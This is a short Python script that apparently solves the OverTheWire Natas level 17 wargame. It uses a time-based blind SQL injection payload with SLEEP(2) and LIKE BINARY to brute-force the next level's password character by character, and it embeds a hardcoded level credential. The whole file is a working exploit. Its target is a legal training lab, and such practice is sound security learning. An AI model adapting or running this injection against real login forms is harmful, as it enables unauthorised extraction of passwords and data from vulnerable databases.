#!/usr/bin/env python
import requests
import string
import time

characters = string.ascii_letters + string.digits

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = f'http://{username}.natas.labs.overthewire.org/?debug=true'
session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        start_time = time.time()
        print("Trying ", "".join(seen_password) + character)
        payload = f'natas18" AND password LIKE BINARY "{"".join(seen_password)}{character}%" AND SLEEP(2)#'
        response = session.post(url, data={'username': payload}, auth=(username, password))
        end_time = time.time()
        difference = end_time - start_time

        if difference > 1:
            seen_password.append(character)
            #print("seen_password.append(character)")
            break

print(f"Password: {''.join(seen_password)}")
